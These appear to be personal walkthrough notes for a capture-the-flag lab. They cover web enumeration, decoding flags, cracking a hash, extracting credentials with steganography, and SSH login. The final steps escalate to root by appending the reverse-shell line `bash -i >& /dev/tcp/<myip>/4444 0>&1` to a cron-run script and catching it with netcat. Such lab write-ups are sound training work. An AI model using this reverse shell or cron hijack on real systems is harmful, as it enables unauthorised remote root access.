Quick notes:
After finding /hidden directory using gobuster, further enumerate to find /hidden/whatever 
- In /hidden/whatever on web the page source has a encoded text, decode it and get flag
- ┌──(kali㉿kali)-[~]
└─$ echo "ZmxhZ3tmMXJzN19mbDRnfQ" | base64 -d
	flag{f1rs7_fl4g}    
- In the apache port http://10.201.91.87:65524/robots.txt there is an unusual user agent, de-hash it and
	 User-Agent:a18672860d0510e5ab6699730763b250 (aka MD5 hash)
	 Unhashed value: flag{1m_s3c0nd_fl4g}
- This line was in page source of  http://10.201.91.87:65524 =   Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
- This line was also in the same page source = 	
	`<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>` 
- BASE64? probably Use cyberchef
- Decoded: **_/n0th1ng3ls3m4tt3r_** (this was so hard to get none of the decoders worked)
- Now go here: http://10.201.89.171:65524/n0th1ng3ls3m4tt3r/ (hoihoihoi)
- `<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>`
- Use the given wordlist to crack it
	command: 
	 john --format=gost --wordlist=/home/kali/Downloads/easypeasy_1596838725703.txt --rules /home/kali/pass.txt
	result: mypasswordforthatjob 
- There is a file in this hidden directory too so save it and use stegseek 
	- command : stegseek  poo.jpeg easypeasy_1596838725703.txt 
	- result: 
	`username:boring 
	`password:01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001`
- decrypted pass: iconvertedmypasswordtobinary (lol)
- Now access ssh using the username and pass but use command `ssh boring@10.201.89.171 -p 6498
- User flag used ROT13 so flip it back
- Use cat /etc/crontab
- find the hidden file
- open it after cd-ing to /var/www
- append this `bash -i >& /dev/tcp/<myip>/4444 0>&1`
- open a nc listener for port 4444 on another tab
- automatically picks it up and you have access now cd to root and cat the hidden .root.txt file